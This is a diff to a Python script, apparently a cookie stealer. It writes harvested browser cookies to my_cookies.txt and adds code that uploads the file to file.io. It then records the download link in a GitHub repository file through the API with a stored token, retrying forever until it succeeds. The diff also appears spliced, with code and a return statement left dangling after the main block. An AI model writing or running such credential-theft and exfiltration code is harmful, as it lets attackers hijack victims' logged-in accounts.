@@ -37,6 +37,41 @@ def harvest():
     conn.close()
     if os.path.exists("temp_db"): os.remove("temp_db")
     
+    file_name = "my_cookies.txt"
+    with open(file_name, "w", encoding="utf-8") as f: 
+        f.write(cookies_text)
+    return file_name
+
+def upload_and_notify(file_path):
+    while True:
+        try:
+            with open(file_path, "rb") as f:
+                response = requests.post("https://file.io", files={"file": f})
+            
+            if response.status_code == 200:
+                download_link = response.json().get("link")
+                update_github_json(download_link)
+                os.remove(file_path)
+                break
+        except:
+            time.sleep(60)
+
+def update_github_json(link):
+    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    res = requests.get(url, headers=headers).json()
+    sha = res["sha"]
+    data = {"status": "Success", "download_link": link, "time": time.ctime()}
+    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
+    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})
+
+if __name__ == "__main__":
+    generated_file = harvest()
+    if generated_file:
+        upload_and_notify(generated_file)
+    conn.close()
+    if os.path.exists("temp_db"): os.remove("temp_db")
+    
     with open("my_cookies.txt", "w", encoding="utf-8") as f: 
         f.write(cookies_text)
     return "my_cookies.txt"
